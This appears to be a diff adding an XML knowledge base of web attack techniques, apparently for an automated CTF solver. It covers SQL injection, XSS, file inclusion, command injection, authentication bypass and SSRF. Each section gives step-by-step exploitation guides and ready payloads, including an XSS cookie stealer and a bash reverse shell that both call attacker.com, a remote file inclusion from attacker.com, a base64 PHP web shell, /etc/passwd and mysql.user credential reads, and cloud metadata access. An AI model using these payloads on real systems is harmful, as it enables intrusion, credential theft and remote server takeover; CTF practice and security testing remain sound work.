@@ -1,0 +1,295 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<web_knowledge_base>
+    <vulnerability_type name="SQL Injection">
+        <common_patterns>
+            <pattern>Error-based: Database errors reveal information</pattern>
+            <pattern>Union-based: UNION SELECT to extract data</pattern>
+            <pattern>Boolean-based: True/false responses</pattern>
+            <pattern>Time-based: Response delay indicates success</pattern>
+            <pattern>Second-order: Injection in stored data</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Identify injection points: parameters, headers, cookies</step>
+            <step>2. Test with basic payloads: ' " \\ --</step>
+            <step>3. Determine database type from error messages</step>
+            <step>4. Extract information using appropriate technique</step>
+            <step>5. Escalate to file system access if possible</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="basic_test">' OR '1'='1'--</payload>
+            <payload type="union_extract">' UNION SELECT user(),database(),version()--</payload>
+            <payload type="error_based">' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</payload>
+            <payload type="time_based">' AND (SELECT SLEEP(5))--</payload>
+            <payload type="file_read">' UNION SELECT LOAD_FILE('/etc/passwd')--</payload>
+            <payload type="mysql_users">' UNION SELECT user,password FROM mysql.user--</payload>
+            <payload type="information_schema">' UNION SELECT table_name,column_name FROM information_schema.columns--</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>Database errors in response</pattern>
+            <pattern>Different responses to true/false conditions</pattern>
+            <pattern>Vulnerable parameters: id, user, search</pattern>
+            <pattern>SQL keywords in error messages</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Cross-Site Scripting (XSS)">
+        <common_patterns>
+            <pattern>Reflected XSS: User input immediately reflected</pattern>
+            <pattern>Stored XSS: Malicious script stored in database</pattern>
+            <pattern>DOM XSS: Client-side script modification</pattern>
+            <pattern>Filter bypass: Encoding, case variation</pattern>
+            <pattern>CSP bypass: Content Security Policy evasion</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Find user input reflection points</step>
+            <step>2. Test basic XSS payloads</step>
+            <step>3. Identify filters and bypass mechanisms</step>
+            <step>4. Craft payload for specific context (HTML, attribute, script)</step>
+            <step>5. Execute payload to steal cookies or perform actions</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="basic_alert">&lt;script&gt;alert('XSS')&lt;/script&gt;</payload>
+            <payload type="cookie_steal">&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</payload>
+            <payload type="img_onerror">&lt;img src=x onerror=alert('XSS')&gt;</payload>
+            <payload type="svg_onload">&lt;svg onload=alert('XSS')&gt;</payload>
+            <payload type="filter_bypass">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</payload>
+            <payload type="event_handler">&lt;body onload=alert('XSS')&gt;</payload>
+            <payload type="javascript_protocol">&lt;a href="javascript:alert('XSS')"&gt;Click&lt;/a&gt;</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>User input reflected in HTML without encoding</pattern>
+            <pattern>User input in script tags or event handlers</pattern>
+            <pattern>Unsafe innerHTML or document.write usage</pattern>
+            <pattern>Missing Content Security Policy</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Local File Inclusion (LFI)">
+        <common_patterns>
+            <pattern>Directory traversal: ../../../etc/passwd</pattern>
+            <pattern>Null byte injection: file.php%00</pattern>
+            <pattern>Filter bypass: Double encoding, mixed case</pattern>
+            <pattern>Log poisoning: Inject code via log files</pattern>
+            <pattern>Wrapper exploitation: php://, data://, expect://</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Identify file inclusion parameters</step>
+            <step>2. Test directory traversal sequences</step>
+            <step>3. Try common sensitive files</step>
+            <step>4. Attempt filter bypass techniques</step>
+            <step>5. Escalate to RCE via log poisoning or wrappers</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="basic_lfi">../../../etc/passwd</payload>
+            <payload type="windows_lfi">..\..\..\..\windows\system32\drivers\etc\hosts</payload>
+            <payload type="null_byte">../../../etc/passwd%00</payload>
+            <payload type="double_encode">..%252f..%252f..%252fetc%252fpasswd</payload>
+            <payload type="php_wrapper">php://filter/convert.base64-encode/resource=config.php</payload>
+            <payload type="data_wrapper">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</payload>
+            <payload type="expect_wrapper">expect://id</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>File parameter names: file, page, include, template</pattern>
+            <pattern>File extensions automatically appended</pattern>
+            <pattern>Directory traversal sequences blocked</pattern>
+            <pattern>File path visible in URLs</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Remote File Inclusion (RFI)">
+        <common_patterns>
+            <pattern>External URL inclusion: http://attacker.com/shell.txt</pattern>
+            <pattern>FTP/SMB inclusion: ftp://attacker.com/shell.php</pattern>
+            <pattern>Data URL inclusion: data:// wrapper</pattern>
+            <pattern>Filter bypass: Protocol switching</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Verify external URL inclusion capability</step>
+            <step>2. Host malicious PHP file on attacker server</step>
+            <step>3. Include remote file via vulnerable parameter</step>
+            <step>4. Execute commands through included file</step>
+            <step>5. Establish persistent shell access</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="basic_rfi">http://attacker.com/shell.txt</payload>
+            <payload type="ftp_rfi">ftp://attacker.com/shell.php</payload>
+            <payload type="data_rfi">data:text/plain,&lt;?php system($_GET['cmd']); ?&gt;</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>allow_url_include enabled</pattern>
+            <pattern>HTTP requests to external domains</pattern>
+            <pattern>File inclusion without proper validation</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Command Injection">
+        <common_patterns>
+            <pattern>Shell metacharacters: ; | &amp; $ ` ( )</pattern>
+            <pattern>Command chaining: cmd1; cmd2</pattern>
+            <pattern>Pipe redirection: cmd | other_cmd</pattern>
+            <pattern>Background execution: cmd &amp;</pattern>
+            <pattern>Variable expansion: $var `cmd`</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Identify system command execution points</step>
+            <step>2. Test shell metacharacters for injection</step>
+            <step>3. Determine OS type (Windows/Linux)</step>
+            <step>4. Chain commands to extract information</step>
+            <step>5. Escalate to reverse shell if possible</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="basic_injection">; ls -la</payload>
+            <payload type="command_substitution">$(whoami)</payload>
+            <payload type="pipe_injection">| cat /etc/passwd</payload>
+            <payload type="background_exec">&amp; id</payload>
+            <payload type="reverse_shell">; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</payload>
+            <payload type="windows_injection">&amp; dir</payload>
+            <payload type="encoded_injection">%3Bls+-la</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>System function calls: system(), exec(), shell_exec()</pattern>
+            <pattern>User input passed to OS commands</pattern>
+            <pattern>Insufficient input sanitization</pattern>
+            <pattern>Command output in response</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Authentication Bypass">
+        <common_patterns>
+            <pattern>SQL injection in login: admin'--</pattern>
+            <pattern>Weak session management: Predictable tokens</pattern>
+            <pattern>Password reset flaws: Token predictability</pattern>
+            <pattern>JWT vulnerabilities: None algorithm, weak secret</pattern>
+            <pattern>Session fixation: Attacker-controlled session ID</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Analyze authentication mechanism</step>
+            <step>2. Test SQL injection in login forms</step>
+            <step>3. Examine session token generation</step>
+            <step>4. Check JWT implementation flaws</step>
+            <step>5. Test password reset functionality</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="sql_login_bypass">admin'--</payload>
+            <payload type="sql_or_bypass">' OR '1'='1'--</payload>
+            <payload type="jwt_none_alg">{"alg":"none","typ":"JWT"}</payload>
+            <payload type="jwt_weak_secret">HS256 with common secret</payload>
+            <payload type="session_prediction">Increment/predict session IDs</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>Login forms without rate limiting</pattern>
+            <pattern>Predictable session tokens</pattern>
+            <pattern>JWT with 'none' algorithm support</pattern>
+            <pattern>Weak password policies</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <vulnerability_type name="Server-Side Request Forgery (SSRF)">
+        <common_patterns>
+            <pattern>Internal service access: localhost, 127.0.0.1</pattern>
+            <pattern>Cloud metadata: 169.254.169.254</pattern>
+            <pattern>Port scanning: Internal network enumeration</pattern>
+            <pattern>Protocol smuggling: gopher://, dict://</pattern>
+            <pattern>Filter bypass: DNS rebinding, redirects</pattern>
+        </common_patterns>
+        <exploitation_guide>
+            <step>1. Identify URL/file fetching functionality</step>
+            <step>2. Test access to internal services</step>
+            <step>3. Attempt cloud metadata access</step>
+            <step>4. Use alternative protocols and encoding</step>
+            <step>5. Chain with other vulnerabilities</step>
+        </exploitation_guide>
+        <example_payloads>
+            <payload type="localhost_access">http://localhost:22</payload>
+            <payload type="aws_metadata">http://169.254.169.254/latest/meta-data/</payload>
+            <payload type="internal_scan">http://192.168.1.1:80</payload>
+            <payload type="gopher_protocol">gopher://localhost:25/_HELO</payload>
+            <payload type="dns_rebinding">http://attacker.com (resolves to 127.0.0.1)</payload>
+        </example_payloads>
+        <detection_patterns>
+            <pattern>URL parameter that fetches content</pattern>
+            <pattern>File upload from URL functionality</pattern>
+            <pattern>Webhook or callback URLs</pattern>
+            <pattern>Image/document processing from URLs</pattern>
+        </detection_patterns>
+    </vulnerability_type>
+
+    <tools_and_techniques>
+        <tool name="Burp Suite">
+            <description>Web application security testing platform</description>
+            <use_cases>Proxy, scanner, intruder, repeater</use_cases>
+        </tool>
+        <tool name="SQLMap">
+            <description>Automatic SQL injection exploitation tool</description>
+            <use_cases>Database extraction, OS shell access</use_cases>
+        </tool>
+        <tool name="OWASP ZAP">
+            <description>Web application security scanner</description>
+            <use_cases>Automated scanning, manual testing</use_cases>
+        </tool>
+        <tool name="Gobuster">
+            <description>Directory and file brute-forcer</description>
+            <use_cases>Hidden file/directory discovery</use_cases>
+        </tool>
+        <tool name="Nikto">
+            <description>Web server scanner</description>
+            <use_cases>Vulnerability detection, server fingerprinting</use_cases>
+        </tool>
+        <tool name="curl">
+            <description>Command line HTTP client</description>
+            <use_cases>Manual request crafting, header manipulation</use_cases>
+        </tool>
+        <tool name="wfuzz">
+            <description>Web application fuzzer</description>
+            <use_cases>Parameter fuzzing, directory brute-forcing</use_cases>
+        </tool>
+    </tools_and_techniques>
+
+    <common_ctf_patterns>
+        <pattern name="Hidden Parameters">
+            <description>Additional parameters not visible in forms</description>
+            <solution>Parameter fuzzing, source code analysis</solution>
+        </pattern>
+        <pattern name="HTTP Verb Tampering">
+            <description>Different behavior with GET vs POST vs PUT</description>
+            <solution>Test all HTTP methods on each endpoint</solution>
+        </pattern>
+        <pattern name="Cookie Manipulation">
+            <description>Session tokens or flags stored in cookies</description>
+            <solution>Decode base64, modify values, check for flags</solution>
+        </pattern>
+        <pattern name="Source Code Comments">
+            <description>Sensitive information in HTML comments</description>
+            <solution>View page source, check for &lt;!-- comments --&gt;</solution>
+        </pattern>
+        <pattern name="Robots.txt">
+            <description>Disallowed paths reveal hidden content</description>
+            <solution>Check /robots.txt for interesting directories</solution>
+        </pattern>
+        <pattern name="Error Message Disclosure">
+            <description>Stack traces reveal file paths and technologies</description>
+            <solution>Trigger errors, analyze debug information</solution>
+        </pattern>
+    </common_ctf_patterns>
+
+    <response_analysis>
+        <indicator name="Database Errors">
+            <mysql>You have an error in your SQL syntax</mysql>
+            <postgresql>ERROR: syntax error at or near</postgresql>
+            <oracle>ORA-00933: SQL command not properly ended</oracle>
+            <mssql>Incorrect syntax near</mssql>
+        </indicator>
+        <indicator name="Framework Detection">
+            <php>Notice: Undefined variable, Warning: include()</php>
+            <asp>Microsoft OLE DB Provider for ODBC Drivers error</asp>
+            <java>java.lang.Exception, org.springframework</java>
+            <python>Traceback (most recent call last)</python>
+        </indicator>
+        <indicator name="Success Patterns">
+            <login>Welcome, Dashboard, Profile, Logout</login>
+            <file_read>root:x:0:0:, etc/passwd content</file_read>
+            <command_exec>uid=, gid=, groups=</command_exec>
+            <flag_pattern>flag{, ctf{, FLAG{</flag_pattern>
+        </indicator>
+    </response_analysis>
+</web_knowledge_base>
